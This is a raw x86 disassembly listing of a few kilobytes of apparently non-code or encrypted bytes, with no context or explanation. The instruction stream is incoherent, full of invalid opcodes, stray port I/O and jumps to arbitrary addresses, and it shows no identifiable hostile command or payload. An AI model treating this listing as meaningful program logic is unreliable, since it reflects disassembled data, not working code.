  4176e7:	scas   eax,DWORD PTR es:[edi]
  4176e8:	jmp    0x4176f6
  4176ea:	std    
  4176eb:	(bad)  
  4176ec:	in     eax,dx
  4176ed:	push   cs
  4176ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176ef:	aad    0x77
  4176f1:	fs pop es
  4176f3:	add    BYTE PTR [eax+0x1f],bl
  4176f6:	jg     0x4176c0
  4176f8:	aam    0x6a
  4176fa:	and    BYTE PTR [esi+esi*2],dh
  4176fd:	ror    BYTE PTR [eax-0x5f03a649],1
  417703:	pop    ecx
  417704:	gs sub edx,ebx
  417707:	mov    ch,0xbb
  417709:	mov    ah,0x9b
  41770b:	xchg   esp,eax
  41770c:	mov    ah,0x50
  41770e:	mov    al,0x7d
  417710:	sbb    dl,bl
  417712:	push   eax
  417713:	mov    al,BYTE PTR [edi+eax*2]
  417716:	ins    BYTE PTR es:[edi],dx
  417717:	add    al,0x45
  417719:	xor    eax,ebp
  41771b:	dec    eax
  41771c:	clc    
  41771d:	cwde   
  41771e:	jno    0x417796
  417720:	push   cs
  417721:	jecxz  0x41770e
  417723:	jecxz  0x4176bb
  417725:	push   ecx
  417726:	sahf   
  417727:	xchg   edi,eax
  417728:	cwde   
  417729:	aad    0x71
  41772b:	mov    ebp,0xbbb5bde2
  417730:	lods   eax,DWORD PTR ds:[esi]
  417731:	sbb    al,BYTE PTR [ebp-0x12]
  417734:	jl     0x41776d
  417736:	mov    dl,BYTE PTR [edi+0x54]
  417739:	frstor [ecx]
  41773b:	daa    
  41773c:	sti    
  41773d:	leave  
  41773e:	shl    DWORD PTR [eax-0x26],1
  417741:	jle    0x4177a5
  417743:	and    ch,BYTE PTR gs:[esp+esi*8+0x4a1b5475]
  41774b:	ins    DWORD PTR es:[edi],dx
  41774c:	mov    cl,0x51
  41774e:	jnp    0x41771b
  417750:	pop    es
  417751:	cmp    al,cl
  417753:	cmp    ebp,DWORD PTR [ebx+0x4c6674a2]
  417759:	xor    eax,0xa647416a
  41775e:	inc    ecx
  41775f:	pop    edx
  417760:	ss leave 
  417762:	push   DWORD PTR [eax+0xf]
  417765:	jb     0x41777b
  417767:	add    eax,0x5e6f0cf4
  41776c:	push   ds
  41776d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41776e:	push   ds
  41776f:	dec    edi
  417770:	mov    ds:0xde52759a,al
  417775:	sti    
  417776:	add    DWORD PTR [eax+0xf97d853],ebp
  41777c:	push   ss
  41777d:	inc    esp
  41777e:	scas   al,BYTE PTR es:[edi]
  41777f:	adc    edi,ebp
  417781:	jno    0x4177c6
  417783:	adc    esp,ebp
  417785:	stos   DWORD PTR es:[edi],eax
  417786:	jge    0x417733
  417788:	outs   dx,BYTE PTR ds:[esi]
  417789:	cwde   
  41778a:	sahf   
  41778b:	xor    eax,0x21455055
  417790:	int3   
  417791:	cmc    
  417792:	xor    al,BYTE PTR ds:0xbb825298
  417798:	push   0x4d
  41779a:	neg    BYTE PTR [esi+0x66]
  41779d:	imul   ebx,DWORD PTR [edi],0x583eaebc
  4177a3:	or     dl,BYTE PTR [edx+0x41]
  4177a6:	imul   ebp,DWORD PTR ds:0x30192696,0xffffffba
  4177ad:	std    
  4177ae:	xchg   ebp,eax
  4177af:	ret    0x32ae
  4177b2:	push   ds
  4177b3:	fwait
  4177b4:	or     eax,0xbaa4c3ca
  4177b9:	mov    esi,0xd8d802fc
  4177be:	or     ah,cl
  4177c0:	call   FWORD PTR [edi-0x35786ad1]
  4177c6:	and    ebx,DWORD PTR [ecx-0x16]
  4177c9:	xor    ecx,DWORD PTR [edx]
  4177cb:	cmp    bl,BYTE PTR [ebp-0x4628ba33]
  4177d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177d2:	cmp    dl,al
  4177d4:	add    esp,DWORD PTR [ebp-0x41]
  4177d7:	imul   ebx,DWORD PTR ds:0x44f40707,0x4e
  4177de:	sbb    cl,BYTE PTR [ecx+0x3c]
  4177e1:	jl     0x417810
  4177e3:	int    0xb2
  4177e5:	mov    edx,0x6f155844
  4177ea:	mov    ch,0x5d
  4177ec:	mov    ecx,0x711e3068
  4177f1:	cmc    
  4177f2:	push   ebx
  4177f3:	lahf   
  4177f4:	aad    0x47
  4177f6:	repnz ds inc edx
  4177f9:	stos   BYTE PTR es:[edi],al
  4177fa:	xor    al,0xfd
  4177fc:	popa   
  4177fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177fe:	jle    0x41781b
  417800:	jnp    0x417869
  417802:	(bad)  [eax]
  417804:	lods   eax,DWORD PTR ds:[esi]
  417805:	dec    eax
  417806:	add    eax,0x61449668
  41780b:	sbb    edx,DWORD PTR [ecx-0x771ecdf6]
  417811:	jmp    0xfa04:0x3e3dfed2
  417818:	nop
  417819:	sbb    al,0xbf
  41781b:	icebp  
  41781c:	xor    BYTE PTR [ebx-0x7f],0xa8
  417820:	sbb    DWORD PTR [esi-0x395519f1],ebp
  417826:	and    DWORD PTR [edx-0x70062f4b],esp
  41782c:	lods   eax,DWORD PTR ds:[esi]
  41782d:	push   ebx
  41782e:	shl    DWORD PTR [ebx-0xe],1
  417831:	daa    
  417832:	mov    ch,0x54
  417834:	sbb    DWORD PTR [edi-0x80],esp
  417837:	(bad)  
  417838:	(bad)  
  417839:	inc    ecx
  41783a:	scas   al,BYTE PTR es:[edi]
  41783b:	or     dh,BYTE PTR [ecx+0x3a]
  41783e:	pusha  
  41783f:	jno    0x4177fa
  417841:	add    eax,0x48c74c98
  417846:	xchg   edi,eax
  417847:	ret    0xfa29
  41784a:	push   cs
  41784b:	out    dx,al
  41784c:	mov    BYTE PTR [eax+0x6d8cdd24],bl
  417852:	mov    edi,0x2814e3c1
  417857:	mov    ch,0x12
  417859:	xchg   ecx,eax
  41785a:	in     eax,0x80
  41785c:	daa    
  41785d:	cmp    esp,DWORD PTR [esi+0x22]
  417860:	outs   dx,BYTE PTR ds:[esi]
  417861:	scas   al,BYTE PTR es:[edi]
  417862:	xor    esp,DWORD PTR [edi-0x22b5c41]
  417868:	daa    
  417869:	in     al,0xdf
  41786b:	hlt    
  41786c:	pushf  
  41786d:	pop    esp
  41786e:	mov    eax,0x879722e8
  417873:	shl    DWORD PTR [edx],0x26
  417876:	mov    BYTE PTR [edx],dl
  417878:	mov    bl,0xb2
  41787a:	mov    ah,0x81
  41787c:	jl     0x4178f0
  41787e:	sbb    esi,ebx
  417880:	test   eax,0x3e196fbd
  417885:	push   ebp
  417886:	xchg   esi,eax
  417887:	cld    
  417888:	rol    cl,cl
  41788a:	ror    DWORD PTR [edx],0x1d
  41788d:	rol    BYTE PTR [eax+0x9],0xfb
  417891:	push   ebx
  417892:	mov    eax,DWORD PTR [edi-0x48104043]
  417898:	add    DWORD PTR [edx+edx*2+0x29],0x5c856e05
  4178a0:	out    dx,al
  4178a1:	or     cl,BYTE PTR [ebp-0x51ed3348]
  4178a7:	aam    0x6b
  4178a9:	ss jmp 0xa4d0fa83
  4178af:	cmc    
  4178b0:	jg     0x4178a9
  4178b2:	dec    esp
  4178b3:	sub    dl,ah
  4178b5:	hlt    
  4178b6:	scas   eax,DWORD PTR es:[edi]
  4178b7:	in     eax,dx
  4178b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178b9:	cmp    BYTE PTR [ebx],dl
  4178bb:	loop   0x4178d8
  4178bd:	add    bh,BYTE PTR ds:0xfcee964
  4178c3:	subps  xmm3,xmm0
  4178c6:	dec    edi
  4178c7:	mov    ah,0x76
  4178c9:	out    dx,eax
  4178ca:	inc    eax
  4178cb:	sbb    ch,BYTE PTR [ecx-0x3c5b73ca]
  4178d1:	pop    es
  4178d2:	xor    al,0x2c
  4178d4:	xchg   edi,eax
  4178d5:	cmp    esi,esp
  4178d7:	and    ecx,DWORD PTR [edi-0x50357109]
  4178dd:	mov    WORD PTR [ebp-0x51],fs
  4178e0:	pop    eax
  4178e1:	inc    edx
  4178e2:	cli    
  4178e3:	mov    ah,0xb0
  4178e5:	les    ecx,FWORD PTR [esi+esi*8+0x175044cc]
  4178ec:	ds loope 0x41788e
  4178ef:	push   ds
  4178f0:	push   ds
  4178f1:	adc    esi,edi
  4178f3:	div    DWORD PTR [ebp+0x75]
  4178f6:	add    DWORD PTR [edx],0xffffffe2
  4178f9:	out    dx,eax
  4178fa:	sub    al,0x89
  4178fc:	or     BYTE PTR [eax+ebp*2+0x40053941],dl
  417903:	adc    DWORD PTR es:[edi],eax
  417906:	inc    ebp
  417907:	inc    eax
  417908:	push   0x2f9fa092
  41790d:	and    DWORD PTR [eax+0x4f],ebx
  417910:	test   bh,dl
  417912:	mov    al,ds:0x747d317f
  417917:	mov    eax,ds:0xcd74ea3a
  41791c:	mov    eax,0xce9dfac7
  417921:	call   0xb6dc94ec
  417926:	jne    0x41796d
  417928:	push   edx
  417929:	mov    ebx,0x8a0be75f
  41792e:	and    ah,dh
  417930:	fnsave [edx+0x600ca6cc]
  417936:	dec    edi
  417937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417938:	push   cs
  417939:	in     eax,dx
  41793a:	mov    BYTE PTR [ecx],bh
  41793c:	adc    bl,BYTE PTR [ebx]
  41793e:	jo     0x417967
  417940:	cmp    DWORD PTR [edx-0x63],0x48c3eac5
  417947:	fdivrp st(5),st
  417949:	sub    cl,BYTE PTR [esi+ecx*8-0x48a8a8ed]
  417950:	cmp    dl,al
  417952:	inc    esp
  417953:	or     dl,BYTE PTR [esi+0x33]
  417956:	dec    eax
  417957:	cmp    DWORD PTR [ebp+0xa],esp
  41795a:	and    DWORD PTR [ebx],ecx
  41795c:	add    bh,BYTE PTR [edx+edx*1-0x6]
  417960:	ja     0x417926
  417962:	lods   al,BYTE PTR ds:[esi]
  417963:	call   0xa15:0x45ad9987
  41796a:	ja     0x41794a
  41796c:	int3   
  41796d:	jne    0x417917
  41796f:	daa    
  417970:	int    0x4d
  417972:	in     al,0x90
  417974:	fist   DWORD PTR [eax-0x24]
  417977:	jecxz  0x417930
  417979:	(bad)  
  41797a:	or     al,0xd1
  41797c:	sbb    eax,esi
  41797e:	enter  0xc7a9,0xa5
  417982:	das    
  417983:	scas   al,BYTE PTR es:[edi]
  417984:	push   0xb5d3c00d
  417989:	sub    eax,0xdba38384
  41798e:	push   ecx
  41798f:	test   eax,0x7a66b1f7
  417994:	add    edi,edi
  417996:	cdq    
  417997:	stc    
  417998:	jns    0x417968
  41799a:	iret   
  41799b:	push   0xbf345218
  4179a0:	(bad)  
  4179a1:	push   edi
  4179a2:	hlt    
  4179a3:	mov    ss,ecx
  4179a5:	sub    BYTE PTR [eax],cl
  4179a7:	xchg   ebx,eax
  4179a8:	sahf   
  4179a9:	in     eax,0x82
  4179ab:	ss ss sub bh,ah
  4179af:	cmp    eax,0xe6ccb6d4
  4179b4:	push   ds
  4179b5:	push   cs
  4179b6:	std    
  4179b7:	fsubr  QWORD PTR [ebp-0x474f956c]
  4179bd:	adc    BYTE PTR [edx+esi*1+0x3c],bl
  4179c1:	and    eax,0x91f8bb9e
  4179c6:	mov    esp,0x4ffc34d9
  4179cb:	sub    dh,0x79
  4179ce:	fsub   QWORD PTR [ebp+0x3]
  4179d1:	nop
  4179d2:	js     0x41797d
  4179d4:	jbe    0x41798c
  4179d6:	pop    ebx
  4179d7:	mov    ds:0xd9a42f5e,eax
  4179dc:	std    
  4179dd:	(bad)  
  4179de:	xor    eax,0x7adefba6
  4179e3:	outs   dx,DWORD PTR ds:[esi]
  4179e4:	call   0x1330110e
  4179e9:	vgetmantss xmm5{k3},xmm1,DWORD PTR [ebx],0x2a
  4179f0:	jb     0x417992
  4179f2:	mov    bh,0x6
  4179f4:	(bad)  
  4179f5:	xlat   BYTE PTR ds:[ebx]
  4179f6:	into   
  4179f7:	push   edx
  4179f8:	dec    ecx
  4179f9:	outs   dx,DWORD PTR ds:[esi]
  4179fa:	sub    esi,ebx
  4179fc:	in     eax,0x57
  4179fe:	stc    
  4179ff:	cmc    
  417a00:	data16 in al,dx
  417a02:	mov    edi,0x815a3661
  417a07:	cmp    BYTE PTR [eax+ebp*4-0xee8302f],al
  417a0e:	fwait
  417a0f:	es popf 
  417a11:	out    0xe,al
  417a13:	std    
  417a14:	jecxz  0x417a2a
  417a16:	sahf   
  417a17:	jecxz  0x417a13
  417a19:	inc    esp
  417a1a:	push   es
  417a1b:	cli    
  417a1c:	push   ebp
  417a1d:	sbb    bl,BYTE PTR [edx+0x12ca770e]
  417a23:	xchg   DWORD PTR [edi+0x16],edi
  417a26:	loope  0x4179db
  417a28:	xchg   ebx,esp
  417a2a:	outs   dx,BYTE PTR ds:[esi]
  417a2b:	xchg   ecx,eax
  417a2c:	imul   esp,DWORD PTR [esi+0x61a4d27c],0xadb0a38a
  417a36:	(bad)  
  417a37:	shl    DWORD PTR [ebx+0x3038381e],cl
  417a3d:	pop    edx
  417a3e:	repz out 0x5c,al
  417a41:	jge    0x4179e7
  417a43:	ret    
  417a44:	mov    edi,0xadfe237
  417a49:	jle    0x4179fd
  417a4b:	and    al,0x22
  417a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a4e:	mov    gs,WORD PTR [ebx+0x6a161360]
  417a54:	push   ds
  417a55:	pushf  
  417a56:	cli    
  417a57:	pushf  
  417a58:	sbb    al,0xe6
  417a5a:	jns    0x417a6d
  417a5c:	push   ebp
  417a5d:	gs push ss
  417a5f:	jnp    0x417a75
  417a61:	xchg   BYTE PTR [ebx+0x7a],bl
  417a64:	fist   WORD PTR [edx+0x27333cfc]
  417a6a:	jl     0x417ac5
  417a6c:	xchg   edx,eax
  417a6d:	cmc    
  417a6e:	je     0x417ac5
  417a70:	ja     0x417ad4
  417a72:	retf   
  417a73:	(bad)  
  417a75:	adc    al,0xea
  417a77:	mov    esp,0xa45152fd
  417a7c:	loopne 0x417a1d
  417a7e:	loopne 0x417a0b
  417a80:	sbb    esp,esp
  417a82:	dec    esp
  417a83:	rcl    BYTE PTR [ebp+0x65],cl
  417a86:	mov    ?,ebx
  417a88:	mov    edx,0x8d5cb752
  417a8d:	aad    0xeb
  417a8f:	adc    eax,0xbcf3679a
  417a94:	sbb    eax,0x9b46c653
  417a99:	adc    eax,0x8db5170e
  417a9e:	popa   
  417a9f:	xlat   BYTE PTR ds:[ebx]
  417aa0:	jl     0x417aa5
  417aa2:	mov    bl,bh
  417aa4:	jbe    0x417b0d
  417aa6:	sahf   
  417aa7:	push   esi
  417aa8:	fstp   TBYTE PTR [ebp-0x48]
  417aab:	xor    al,BYTE PTR [eax]
  417aad:	or     al,0x7f
  417aaf:	mov    WORD PTR [ecx+0x4f23473],ds
  417ab5:	xor    al,0xae
  417ab7:	sub    BYTE PTR ds:0xb11bc1dd,cl
  417abd:	jae    0x417ac3
  417abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ac0:	cmp    DWORD PTR [edx-0x73],esp
  417ac3:	mov    edx,0x8777afeb
  417ac8:	xlat   BYTE PTR ds:[ebx]
  417ac9:	and    DWORD PTR [ecx+0xf1954c9],ecx
  417acf:	in     eax,0x16
  417ad1:	stc    
  417ad2:	daa    
  417ad3:	jo     0x417b1a
  417ad5:	test   al,0xde
  417ad7:	hlt    
  417ad8:	mov    eax,ds:0x560c9f97
  417add:	das    
  417ade:	fwait
  417adf:	shl    BYTE PTR [ebx],1
  417ae1:	int3   
  417ae2:	cmp    ch,BYTE PTR [edx-0x348bc195]
  417ae8:	xchg   ebx,eax
  417ae9:	cs push ss
  417aeb:	dec    ebx
  417aec:	(bad)  
  417aed:	dec    dl
  417aef:	jae    0x417aa1
  417af1:	jl     0x417aef
  417af3:	mov    ecx,DWORD PTR [edx+0x21a8e899]
  417af9:	push   0xb74d816a
  417afe:	ss loopne 0x417ae3
  417b01:	out    0xbf,eax
  417b03:	std    
  417b04:	in     eax,0x19
  417b06:	in     eax,0xb4
  417b08:	ins    BYTE PTR es:[edi],dx
  417b09:	hlt    
  417b0a:	stos   BYTE PTR es:[edi],al
  417b0b:	(bad)  
  417b0d:	arpl   WORD PTR [esi+0x2e],bx
  417b10:	scas   eax,DWORD PTR es:[edi]
  417b11:	sbb    esi,edx
  417b13:	lahf   
  417b14:	xchg   esi,eax
  417b15:	mov    eax,DWORD PTR [esi]
  417b17:	imul   ebp,DWORD PTR [ebx],0xbffe0b88
  417b1d:	jns    0x417adb
  417b1f:	(bad)  
  417b20:	adc    BYTE PTR [eax],ah
  417b22:	hlt    
  417b23:	sahf   
  417b24:	out    dx,eax
  417b25:	leave  
  417b26:	and    ch,BYTE PTR [esi]
  417b28:	mov    ch,0x2f
  417b2a:	shl    BYTE PTR [edi+eax*1+0xfcd6747],1
  417b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b32:	jno    0x417afd
  417b34:	adc    al,0x4a
  417b36:	aaa    
  417b37:	xchg   esp,eax
  417b38:	push   ss
  417b39:	jnp    0x417b5b
  417b3b:	mov    edi,0x5588b4a1
  417b40:	call   0xa48a:0x5cac22e2
  417b47:	test   DWORD PTR [eax],0x8e1caeec
  417b4d:	cmc    
  417b4e:	test   DWORD PTR [ebx-0x7a6f516c],esi
  417b54:	add    eax,DWORD PTR ss:[ecx-0x7d1ff4a6]
  417b5b:	mov    dh,0xb1
  417b5d:	jmp    0x417bd4
  417b5f:	mov    al,ds:0xdf8737f4
  417b64:	nop
  417b65:	xor    al,0x31
  417b67:	xor    DWORD PTR [edi],ecx
  417b69:	cld    
  417b6a:	and    DWORD PTR [ebp-0x679be294],edi
  417b70:	push   ebx
  417b71:	bound  esi,QWORD PTR [ecx+0x594ce319]
  417b77:	push   edi
  417b78:	aaa    
  417b79:	mov    esi,0xd9f61fd4
  417b7e:	and    DWORD PTR [ebx],ebp
  417b80:	and    DWORD PTR [edi-0x4f],esp
  417b83:	scas   al,BYTE PTR es:[edi]
  417b84:	add    al,0x4a
  417b86:	fistp  WORD PTR [esi+0x7bd949b2]
  417b8c:	ins    DWORD PTR es:[edi],dx
  417b8d:	cli    
  417b8e:	pop    ebp
  417b8f:	arpl   WORD PTR [eax],si
  417b91:	push   ds
  417b92:	out    0x24,eax
  417b94:	ins    DWORD PTR es:[edi],dx
  417b95:	sti    
  417b96:	shl    DWORD PTR [ebp-0x2622c8e2],1
  417b9c:	lahf   
  417b9d:	xchg   DWORD PTR [eax],esp
  417b9f:	inc    ecx
  417ba0:	scas   al,BYTE PTR es:[edi]
  417ba1:	aaa    
  417ba2:	mov    ah,0xe1
  417ba4:	shl    DWORD PTR [edx+0x3449b1c8],1
  417baa:	loope  0x417b87
  417bac:	push   ecx
  417bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bae:	ret    
  417baf:	inc    edi
  417bb0:	and    edi,DWORD PTR [eax]
  417bb2:	lock adc eax,0xa21ceea6
  417bb8:	push   edi
  417bb9:	add    al,0xc8
  417bbb:	pop    es
  417bbc:	mov    edx,0xfe09ca10
  417bc1:	jae    0x417b94
  417bc3:	ins    BYTE PTR es:[edi],dx
  417bc4:	aaa    
  417bc5:	xchg   esp,eax
  417bc6:	pop    esi
  417bc7:	dec    ebx
  417bc8:	repnz lea edx,[edx+0x69]
  417bcc:	inc    ebp
  417bcd:	push   ebp
  417bce:	or     ebp,DWORD PTR [ebp-0x22]
  417bd1:	lods   al,BYTE PTR ds:[esi]
  417bd2:	(bad)  
  417bd4:	inc    esi
  417bd5:	pop    edx
  417bd6:	daa    
  417bd7:	add    eax,0x98f22302
  417bdc:	fisttp DWORD PTR [esi]
  417bde:	retf   0x198
  417be1:	ret    0xf875
  417be4:	aam    0xeb
  417be6:	push   ecx
  417be7:	pushf  
  417be8:	jp     0x417c03
  417bea:	pop    ebx
  417beb:	sbb    eax,0x72dd4338
  417bf0:	fisttp DWORD PTR [edi]
  417bf2:	inc    ecx
  417bf3:	mov    ebp,0xe1dcd353
  417bf8:	cdq    
  417bf9:	shl    DWORD PTR [edi-0x1b55abd2],cl
  417bff:	cmp    DWORD PTR [ecx-0x4e8f18b3],0x66ed519b
  417c09:	repz xor ecx,ebp
  417c0c:	xor    al,0x33
  417c0e:	jmp    0x1f08ca6c
  417c13:	sbb    al,0xc3
  417c15:	ret    
  417c16:	mov    eax,0xca3939fc
  417c1b:	jmp    0x39f61997
  417c20:	sub    DWORD PTR ds:0x39d7e7a9,edi
  417c26:	pop    esp
  417c27:	xor    eax,0x2bb99e53
  417c2d:	(bad)  
  417c2e:	iret   
  417c2f:	inc    edx
  417c30:	push   eax
  417c31:	xchg   esi,eax
  417c32:	cli    
  417c33:	jp     0x417bbf
  417c35:	int    0xa3
  417c37:	xor    al,0xc0
  417c39:	lock pop eax
  417c3b:	cli    
  417c3c:	in     al,0x4f
  417c3e:	mov    al,BYTE PTR ds:0x52fc6aea
  417c44:	jge    0x417c13
  417c46:	jns    0x417c39
  417c48:	fsub   DWORD PTR ds:0xc1313b3e
  417c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c4f:	out    0x65,eax
  417c51:	retf   
  417c52:	jmp    0x20bc66b4
  417c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c58:	or     BYTE PTR [esi],ch
  417c5a:	shl    ecx,0x34
  417c5d:	repnz clc 
  417c5f:	mov    dl,al
  417c61:	fisubr DWORD PTR [esi+0x75]
  417c64:	in     eax,dx
  417c65:	push   es
  417c66:	loop   0x417c2c
  417c68:	or     al,0x1e
  417c6a:	xchg   BYTE PTR [edx],dl
  417c6c:	jns    0x417c18
  417c6e:	cmp    DWORD PTR [eax],esp
  417c70:	pop    ss
  417c71:	add    ch,BYTE PTR [edi+0x6043768a]
  417c77:	aaa    
  417c78:	xor    ah,BYTE PTR [ecx+edx*4+0x1f]
  417c7c:	in     al,dx
  417c7d:	add    BYTE PTR [ecx],0x71
  417c80:	xrelease xchg DWORD PTR [ecx],edx
  417c83:	mov    ch,0x72
  417c85:	xor    dl,BYTE PTR ds:0x8374ac2d
  417c8b:	xlat   BYTE PTR ds:[ebx]
  417c8c:	shl    BYTE PTR [edi-0x68],0xe1
  417c90:	pop    ds
  417c91:	sbb    eax,DWORD PTR [edi]
  417c93:	in     eax,0xe1
  417c95:	pop    ebx
  417c96:	xchg   BYTE PTR [esi],cl
  417c98:	jge    0x417c75
  417c9a:	dec    ebp
  417c9b:	in     eax,0xb4
  417c9d:	out    dx,al
  417c9e:	lea    ebx,[eax]
  417ca0:	out    0xe3,eax
  417ca2:	int    0x6c
  417ca4:	pop    esi
  417ca5:	adc    DWORD PTR [ebx],esi
  417ca7:	test   BYTE PTR [esi+0x5a1fbe74],al
  417cad:	cmp    BYTE PTR [ebx],bh
  417caf:	call   0xd28f:0xe51a9354
  417cb6:	sbb    dh,BYTE PTR [esi]
  417cb8:	dec    eax
  417cb9:	cmp    BYTE PTR [ebx],cl
  417cbb:	das    
  417cbc:	out    dx,eax
  417cbd:	add    DWORD PTR [ebp-0x7a],eax
  417cc0:	cmp    al,0x49
  417cc2:	xor    dl,BYTE PTR [ebx]
  417cc4:	out    0xdc,al
  417cc6:	or     dl,BYTE PTR [esi+0x4f]
  417cc9:	loopne 0x417cee
  417ccb:	add    ecx,ecx
  417ccd:	nop
  417cce:	ret    
  417ccf:	sbb    BYTE PTR [edx-0x2d],dl
  417cd2:	or     DWORD PTR [edi+0x25],edx
  417cd5:	pop    esi
  417cd6:	dec    ebx
  417cd7:	addr16 xchg edx,eax
  417cd9:	xchg   BYTE PTR [edi+edi*8+0x2d9a9cf8],cl
  417ce0:	adc    eax,0xe209c69f
  417ce5:	fiadd  DWORD PTR [eax]
  417ce7:	jg     0x417d09
  417ce9:	pop    ebx
  417cea:	lock and al,0x5b
  417ced:	ds popf 
  417cef:	mov    dl,bh
  417cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cf2:	fist   DWORD PTR [esi-0x40]
  417cf5:	popa   
  417cf6:	or     eax,DWORD PTR [esi+0x7903c8ab]
  417cfc:	push   0xda3545f1
  417d01:	jbe    0x417d41
  417d03:	into   
  417d04:	or     dh,ah
  417d06:	add    bl,BYTE PTR [ebp+ebx*2-0x1785d3a5]
  417d0d:	mov    ch,0x5b
  417d0f:	repz js 0x417d7d
  417d12:	mov    eax,ds:0xbdb80df2
  417d17:	add    eax,0x6915a00a
  417d1c:	loop   0x417d37
  417d1e:	lock mov BYTE PTR [esi],ah
  417d21:	in     eax,0xad
  417d23:	imul   edi,DWORD PTR [ecx-0x7f],0xffffff86
  417d27:	imul   eax,DWORD PTR [edi-0x45408a1],0x2a877738
  417d31:	mov    edi,0x6c85012b
  417d36:	fs ds dec ebx
  417d39:	jge    0x417d9c
  417d3b:	(bad)
  417d3e:	push   edx
  417d3f:	mov    dh,0x1e
  417d41:	cld    
  417d42:	ud1    esi,DWORD PTR [ebp-0xb]
  417d46:	pushf  
  417d47:	ins    BYTE PTR es:[edi],dx
  417d48:	retf   0x4480
  417d4b:	imul   ecx,DWORD PTR [ebp-0x4a],0xffffffa0
  417d4f:	sub    dh,ch
  417d51:	and    eax,0xc331c653
  417d56:	out    dx,eax
  417d57:	mov    ebp,0xbcdc14b5
  417d5c:	inc    esi
  417d5d:	rol    al,0xbb
  417d60:	leave  
  417d61:	sub    ch,bh
  417d63:	xor    esi,DWORD PTR [ebx]
  417d65:	cmpps  xmm3,XMMWORD PTR [edx],0x6b
  417d69:	cli    
  417d6a:	xchg   BYTE PTR [eax-0x7e],bl
  417d6d:	mov    ds:0xbb001939,al
  417d72:	xchg   eax,eax
  417d74:	lea    eax,[esp+eax*8-0x2f]
  417d78:	push   edi
  417d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d7b:	pop    es
  417d7c:	lods   eax,DWORD PTR ds:[esi]
  417d7d:	sub    eax,0x740d737f
  417d82:	in     eax,0xf
  417d84:	neg    DWORD PTR [ebx+0x5d209f38]
  417d8a:	jbe    0x417d29
  417d8c:	mov    esi,0x7e897982
  417d91:	in     eax,0x33
  417d93:	stos   DWORD PTR es:[edi],eax
  417d94:	ret    
  417d95:	repz pop ecx
  417d97:	xor    DWORD PTR [esi],ebp
  417d99:	push   cs
  417d9a:	adc    dl,cl
  417d9c:	ret    
  417d9d:	mov    dh,0xa2
  417d9f:	jns    0x417dc9
  417da1:	and    DWORD PTR [ebx+0x1d1a5814],esi
  417da7:	mov    esp,0xaf60daf3
  417dac:	iret   
  417dad:	dec    ecx
  417dae:	cmp    bl,BYTE PTR [ebp+0x4b]
  417db1:	mul    DWORD PTR [esi]
  417db3:	and    eax,0xfc836273
  417db8:	cmp    eax,0x5cd95342
  417dbd:	or     esi,DWORD PTR [edx]
  417dbf:	mov    esp,0x55b1b0f2
  417dc4:	mov    WORD PTR [ebp+0x1a],ds
  417dc7:	test   eax,0x8b06b756
  417dcc:	inc    edx
  417dcd:	pop    edx
  417dce:	aam    0xfe
  417dd0:	cdq    
  417dd1:	test   eax,0x4a804bd6
  417dd6:	push   ds
  417dd7:	rcl    DWORD PTR [ecx],cl
  417dd9:	xchg   ebx,eax
  417dda:	dec    esp
  417ddb:	xor    DWORD PTR [eax+0xe],edi
  417dde:	fbld   TBYTE PTR ds:0xef572d0d
  417de4:	rcr    DWORD PTR [esi-0x24],1
  417de7:	pusha  
  417de8:	stos   BYTE PTR es:[edi],al
  417de9:	call   0x2195:0x10f69b63
  417df0:	fldenv [edi-0x7c043c7a]
  417df6:	pop    eax
  417df7:	inc    eax
  417df8:	xor    DWORD PTR [ecx+0x21],eax
  417dfb:	pop    ecx
  417dfc:	repz mov edi,0xb6127c86
  417e02:	mov    edi,0xe8d87109
  417e07:	add    eax,0xa0fb4055
  417e0c:	and    eax,0xea503c20
  417e11:	cmp    BYTE PTR [edx+0x1b0c31d1],al
  417e17:	stos   DWORD PTR es:[edi],eax
  417e18:	mov    al,0xd9
  417e1a:	pop    ss
  417e1b:	adc    al,0xff
  417e1d:	cmc    
  417e1e:	fucomp st(2)
  417e20:	or     ecx,0x26
  417e23:	mov    al,ds:0xf506bdac
  417e28:	pop    esi
  417e29:	push   esi
  417e2a:	fwait
  417e2b:	sbb    ecx,ecx
  417e2d:	push   esp
  417e2e:	sbb    eax,0x1ce5f2c9
  417e33:	adc    DWORD PTR [ecx-0x5c],0xdc19c45b
  417e3a:	sub    edx,DWORD PTR [esp+eax*2]
  417e3d:	retf   
  417e3e:	(bad)  
  417e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e40:	(bad)  
  417e41:	outs   dx,DWORD PTR ds:[esi]
  417e42:	adc    ebp,eax
  417e44:	popf   
  417e45:	push   edi
  417e46:	rol    BYTE PTR [edx+eiz*8],1
  417e49:	cmp    ecx,DWORD PTR [edx+0x7d6edab9]
  417e4f:	fs inc ebp
  417e51:	push   0x85442dbe
  417e56:	scas   eax,DWORD PTR es:[edi]
  417e57:	xchg   ecx,eax
  417e58:	mov    WORD PTR [edi],?
  417e5a:	scas   al,BYTE PTR es:[edi]
  417e5b:	xor    bl,cl
  417e5d:	inc    esi
  417e5e:	adc    al,0xda
  417e60:	pop    ebx
  417e61:	aaa    
  417e62:	mov    bl,0x49
  417e64:	cmp    ah,BYTE PTR [ebx]
  417e66:	leave  
  417e67:	ror    DWORD PTR [ecx],1
  417e69:	add    al,0x6f
  417e6b:	icebp  
  417e6c:	bound  esi,QWORD PTR [ebx]
  417e6e:	inc    ecx
  417e6f:	or     DWORD PTR [edi+0x44fb6078],esp
  417e75:	sbb    bl,BYTE PTR [ebx]
  417e77:	add    eax,0x29b999f6
  417e7c:	pop    ss
  417e7d:	jg     0x417e17
